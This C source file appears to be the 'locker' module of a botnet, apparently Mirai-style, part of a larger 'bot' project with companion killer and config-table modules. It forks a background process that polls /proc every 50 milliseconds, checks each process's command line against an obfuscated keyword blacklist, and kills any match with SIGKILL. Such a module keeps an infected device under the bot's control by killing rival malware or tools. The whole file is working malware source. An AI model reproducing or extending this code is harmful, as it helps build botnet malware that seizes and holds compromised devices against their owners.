#include <ctype.h>
#include <dirent.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>

#include "bot/config/table.h"
#include "bot/definitions.h"
#include "bot/modules/killer.h"
#include "bot/modules/locker.h"
#include "bot/utils/string.h"
#include "bot/utils/xoshiro.h"

typedef struct _node {
  pid_t pid;
  struct _node *next;
} node_t, *pnode_t;

static pnode_t cache = NULL;
static time_t last_scan = 0;
static pid_t locker_pid = -1;

void locker_cache_insert(pid_t pid) {
  pnode_t node = malloc(sizeof(node_t));
  node->pid = pid;
  node->next = cache;
  cache = node;
}

void locker_cache_clear() {
  // iterates through all nodes, free each of them
  for (pnode_t current = cache; current != NULL;) {
    pnode_t next = current->next;
    free(current);
    current = next;
  }

  // finally, set the whole cache to 0
  cache = NULL;
}

bool locker_cache_exists(pid_t pid) {
  // iterates through all nodes until a matched pid
  for (pnode_t node = cache; node != NULL; node = node->next)
    if (node->pid == pid) return true;

  // lol we didnt find anything
  return false;
}

static inline bool locker_check_keywords(pprocess_info_t proc) {
  bool found = false;
  ptokenizer_t tokenizer = tokenizer_new(table_retrieve(TABLE_LOCKER_BLACKLIST, NULL), ",");
  if (!tokenizer) return false;

  /* iterate thru all tokens */
  for (int i = 0; i < tokenizer->size; i++) {
    char *token = tokenizer->tokens[i];

    if (str_search(proc->cmdline, token, proc->cmdline_len, strlen(token)) > 0) {
      found = true;
      break;
    }
  }

  /* free tokens, return if we found blacklisted keyword */
  tokenizer_free(tokenizer);
  return found;
}

/* checks the cmdline for a blacklisted string */
static inline bool locker_check_pid(char *pid) {
  process_info_t proc = {};
  memset(&proc, '\0', sizeof(process_info_t));

  /* retrieve the cmdline */
  killer_retrieve_cmdline(pid, &proc);
  if (proc.cmdline_len <= 0) return false;

  /* check common keywords */
  return locker_check_keywords(&proc);
}

void locker_check_proc(bool cache) {
  if (cache) {
    locker_cache_clear();
    last_scan = time(NULL);
  }

  /* open the directory */
  DIR *dir = opendir(table_retrieve(TABLE_KILLER_PROC, NULL));
  if (!dir) return;

  /* read the directory */
  struct dirent *entry;
  while ((entry = readdir(dir)) != NULL) {
    if (!isdigit(*entry->d_name)) continue;
    pid_t pid = atoi(entry->d_name);

    /* skip if its already in the cache */
    if (locker_cache_exists(pid)) {
      continue;
    }

    /* handle new process execution */
    if (locker_check_pid(entry->d_name)) {
      LOG_INFO("Killing %d", entry->d_name);
      kill(pid, 9);
      continue;
    }

    /* cache the process */
    if (cache) locker_cache_insert(pid);
  }

  closedir(dir);
}

void locker_init() {
  if ((locker_pid = fork()) <= 0) {
    return;
  }

  // initial proc check
  locker_check_proc(true);

  // check and clean cache every ~10s
  while (true) {
    locker_check_proc(time(NULL) - last_scan >= 10);
    usleep(50000);
  }
}

void locker_kill() {
  if (locker_pid == -1) return;

  kill(locker_pid, 9);
  locker_pid = -1;
}
